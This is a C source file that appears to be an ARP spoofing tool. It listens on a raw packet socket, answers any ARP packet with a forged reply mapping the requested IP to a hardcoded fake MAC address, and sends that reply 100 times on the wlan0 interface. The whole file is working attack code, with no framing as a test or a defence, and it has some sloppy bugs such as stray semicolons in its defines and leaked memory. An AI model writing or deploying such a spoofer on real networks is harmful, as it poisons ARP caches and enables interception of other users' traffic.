#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<stdint.h>
#include<assert.h>
#include<errno.h>
#include<unistd.h>
#include<netinet/ip.h>
#include<linux/if_arp.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#define FRAME_SIZE 44;
#define ETHERNET_LINK_SIZE 14;

#define EXIT_FAIL 0

#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  	uint16_t htype;
    	uint16_t ptype;
      	uint8_t hlen;
        uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};


uint8_t* get_spoofed_MAC()
{	
	uint8_t* mac = (uint8_t*)malloc(sizeof(uint8_t)*6);
	mac[0] = 0xAA;
	mac[1] = 0xAA;
	mac[2] = 0xAB;
	mac[3] = 0xBB;
	mac[4] = 0x12;
	mac[5] = 0x11;
	return mac;
}


uint8_t* create_buffer(int len)
{
	uint8_t* buffer = (uint8_t*)malloc(sizeof(uint8_t)*len);
	if( buffer == NULL )
	{
		perror("Error in allocating the memory in create_buffer\n");
		exit(0);
	}
	
	if( memset(buffer,0,len) == -1 )
	{
		perror("Error in memset\n");
		exit(0);
	}

	return buffer;
}

int get_if_no(char* if_name)
{
	struct ifreq ifr;
	size_t if_name_len=strlen(if_name);
	if (if_name_len<sizeof(ifr.ifr_name)) {
	    memcpy(ifr.ifr_name,if_name,if_name_len);
	    ifr.ifr_name[if_name_len]=0;
	} else {
	    printf("interface name is too long");
	    exit(0);
	}
	
	
	// Open a socket
	int fd=socket(AF_UNIX,SOCK_DGRAM,0);
	if (fd==-1) {
	    printf("socket error in get_if");
	    exit(0);
	}
	
	if (ioctl(fd,SIOCGIFINDEX,&ifr)==-1) {
	    printf(" error in get_if");
	    exit(0);
	}
	
	return ifr.ifr_ifindex;
}


int main()
{
	int i;
	int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if( fd == -1 )
	{
		perror("Error opening ARP Socket\n");
		exit(EXIT_FAILURE);
	}
	while( 1 )
	{
		uint8_t* buffer = create_buffer(IP_MAXPACKET);
		
		/* Receive the packet */

		int status;

		while( ( status = recv(fd,buffer,IP_MAXPACKET,0) ) < 0)
		{
			if (errno == EINTR) {
				memset (buffer, 0, IP_MAXPACKET * sizeof (uint8_t));
				continue;  // Something weird happened, but let's try again
			} else {
				perror ("recv() failed:");
				exit (EXIT_FAILURE);
			}
		}
		printf("I got a packet\n");
		printf("Dst MAC : ");
		for(i=0;i<6;i++)
		{
			printf("%2x",buffer[i]);
		}
		printf("\n");
		printf("Src MAC : ");
		for(i=0;i<6;i++)
		{
			printf("%2x",buffer[i+6]);
		}
		printf("\n");
		
		arp_hdr* arp_header = (arp_hdr*)(buffer+14);
		

		/* Create a target socket address structure */
		struct sockaddr_ll socket_address;
		socket_address.sll_family   = PF_PACKET;	
		/*we use ARP protocoll above ethernet layer */
		socket_address.sll_protocol = htons(ETH_P_ARP);	

		/*index of the network device*/
		
		socket_address.sll_ifindex  = get_if_no("wlan0");
		//socket_address.sll_ifindex  = 1;

		/*ARP hardware identifier is ethernet*/
		socket_address.sll_hatype   = ARPHRD_ETHER;
	
		/*target is another host*/
		socket_address.sll_pkttype  = PACKET_OTHERHOST;

		/*address length*/
		socket_address.sll_halen    = ETH_ALEN;		
		/*MAC - begin*/
		socket_address.sll_addr[0]  = buffer[6];		
		socket_address.sll_addr[1]  = buffer[7];		
		socket_address.sll_addr[2]  = buffer[8];
		socket_address.sll_addr[3]  = buffer[9];
		socket_address.sll_addr[4]  = buffer[10];
		socket_address.sll_addr[5]  = buffer[11];
		/*MAC - end*/
		//socket_address.sll_addr[6]  = 0x00;/*not used*/
		//socket_address.sll_addr[7]  = 0x00;/*not used*/
		

		/* End */
		
		// Copy the IP addres
		uint8_t temp[4];
		memcpy(temp,arp_header->target_ip,4);
		memcpy(arp_header->target_ip,arp_header->sender_ip,4);
		memcpy(arp_header->sender_ip,temp,4);

		memcpy(arp_header->target_mac,arp_header->sender_mac,6);
		
		// Copy spoofed MAC Address
		memcpy(arp_header->sender_mac,get_spoofed_MAC(),6);
		
		arp_header->opcode = htons(2);
	
		memcpy(buffer,buffer+6,6);

		memcpy(buffer+6,get_spoofed_MAC(),6);

		int n = 0;
		while( n < 100 )
		{
			if( sendto(fd,buffer,44,0,(struct sockaddr*)&socket_address, sizeof(socket_address)) < 0 )
			{
				perror("Error sending\n");
				exit(0);
			}
			printf("sent\n");
			n++;
		}

		printf("Sent back the reply\n");
		break;
		
		//


		// 

		/*
			Buffer has Ethernet-ARP
			So, skip ethernet header
		*/
		free(buffer);
	}
}
